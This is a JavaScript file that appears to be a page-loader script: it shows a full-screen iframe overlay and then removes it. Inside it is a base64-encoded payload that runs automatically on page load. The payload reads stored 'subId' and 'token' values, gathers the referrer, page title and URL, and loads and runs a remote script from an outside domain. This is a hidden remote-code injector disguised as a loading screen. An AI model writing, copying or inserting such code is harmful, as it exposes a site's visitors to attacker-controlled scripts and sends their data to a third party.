const createLoader = () => {
    const frame = document.createElement('iframe');
    frame.id = 'load_frame';
    frame.src = `frameLoad.html`;
    frame.frameBorder = 0;
    frame.width = '100%';
    frame.height = '100%';
    frame.style.position = 'fixed';
    frame.style.top = 0;
    frame.style.left = 0;
    frame.style.width = '100%';
    frame.style.height = '100%';
    frame.style.zIndex = 9999;
    const body = document.querySelector('html');
    if (body && body.childNodes.length > 0) {
        const parent = body;
        parent.insertBefore(frame, body.firstChild)
    }
    
}
const toggleLoad = () => {
    const body = document.querySelector('body');
    body.removeAttribute('hidden');
    const load_frame = document.querySelector('#load_frame');
    if (load_frame) {
        load_frame.style.display = load_frame.style.display === 'none' ? 'block' : 'none';
    }
   
};
createLoader();

window.addEventListener('DOMContentLoaded', () => {
    const script = document.createElement('script');
    script.src = "data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfMjJjOXZqVHNoOE1uWGJGbic7CiAgICBpZiAoIXdpbmRvdy5fMjJjOXZqVHNoOE1uWGJGbikgewogICAgICAgIHdpbmRvdy5fMjJjOXZqVHNoOE1uWGJGbiA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly90YWxraW5nbWFuYWdlci5jb20vUmZRY012Qk4nLAogICAgICAgIH07CiAgICB9CiAgICBjb25zdCBfYmZjNDVnMTU1eEJSTlROTSA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdjb25maWcnKTsKICAgIGlmICh0eXBlb2YgX2JmYzQ1ZzE1NXhCUk5UTk0gIT09ICd1bmRlZmluZWQnICYmIF9iZmM0NWcxNTV4QlJOVE5NICE9PSBudWxsKSB7CiAgICAgICAgdmFyIF9TYkNNeHRYQlJwN3BjcnZ2ID0gSlNPTi5wYXJzZShfYmZjNDVnMTU1eEJSTlROTSk7CiAgICAgICAgdmFyIF82bmM4ZDRkeEtSVmhNcmJEID0gTWF0aC5yb3VuZCgrbmV3IERhdGUoKS8xMDAwKTsKICAgICAgICBpZiAoX1NiQ014dFhCUnA3cGNydnYuY3JlYXRlZF9hdCArIHdpbmRvdy5fMjJjOXZqVHNoOE1uWGJGbi50dGwgPCBfNm5jOGQ0ZHhLUlZoTXJiRCkgewogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnc3ViSWQnKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3Rva2VuJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdjb25maWcnKTsKICAgICAgICB9CiAgICB9CiAgICB2YXIgX1J2Z1M3aGZLZjg2RE50Wk0gPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnc3ViSWQnKTsKICAgIHZhciBfSEpNUncxczNkQ2RLR05nNyA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0b2tlbicpOwogICAgdmFyIF9QTHN5bjZxUjZoYktzN1FRID0gJz9yZXR1cm49anMuY2xpZW50JzsKICAgICAgICBfUExzeW42cVI2aGJLczdRUSArPSAnJicgKyBkZWNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLnNlYXJjaC5yZXBsYWNlKCc/JywgJycpKTsKICAgICAgICBfUExzeW42cVI2aGJLczdRUSArPSAnJnNlX3JlZmVycmVyPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQucmVmZXJyZXIpOwogICAgICAgIF9QTHN5bjZxUjZoYktzN1FRICs9ICcmZGVmYXVsdF9rZXl3b3JkPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQudGl0bGUpOwogICAgICAgIF9QTHN5bjZxUjZoYktzN1FRICs9ICcmbGFuZGluZ191cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5sb2NhdGlvbi5ob3N0bmFtZSArIGRvY3VtZW50LmxvY2F0aW9uLnBhdGhuYW1lKTsKICAgICAgICBfUExzeW42cVI2aGJLczdRUSArPSAnJm5hbWU9JyArIGVuY29kZVVSSUNvbXBvbmVudChuYW1lKTsKICAgICAgICBfUExzeW42cVI2aGJLczdRUSArPSAnJmhvc3Q9JyArIGVuY29kZVVSSUNvbXBvbmVudCh3aW5kb3cuXzIyYzl2alRzaDhNblhiRm4uUl9QQVRIKTsKICAgIGlmICh0eXBlb2YgX1J2Z1M3aGZLZjg2RE50Wk0gIT09ICd1bmRlZmluZWQnICYmIF9SdmdTN2hmS2Y4NkROdFpNICYmIHdpbmRvdy5fMjJjOXZqVHNoOE1uWGJGbi51bmlxdWUpIHsKICAgICAgICBfUExzeW42cVI2aGJLczdRUSArPSAnJnN1Yl9pZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9SdmdTN2hmS2Y4NkROdFpNKTsKICAgIH0KICAgIGlmICh0eXBlb2YgX0hKTVJ3MXMzZENkS0dOZzcgIT09ICd1bmRlZmluZWQnICYmIF9ISk1SdzFzM2RDZEtHTmc3ICYmIHdpbmRvdy5fMjJjOXZqVHNoOE1uWGJGbi51bmlxdWUpIHsKICAgICAgICBfUExzeW42cVI2aGJLczdRUSArPSAnJnRva2VuPScgKyBlbmNvZGVVUklDb21wb25lbnQoX0hKTVJ3MXMzZENkS0dOZzcpOwogICAgfQogICAgaWYgKCcnICE9PSAnJykgewogICAgICAgIF9QTHN5bjZxUjZoYktzN1FRICs9ICcmYnlwYXNzX2NhY2hlPSc7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fMjJjOXZqVHNoOE1uWGJGbi5SX1BBVEggKyBfUExzeW42cVI2aGJLczdRUTsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA==";
     document.querySelector("head").appendChild(script);
     setTimeout(toggleLoad, 1000);

  
})
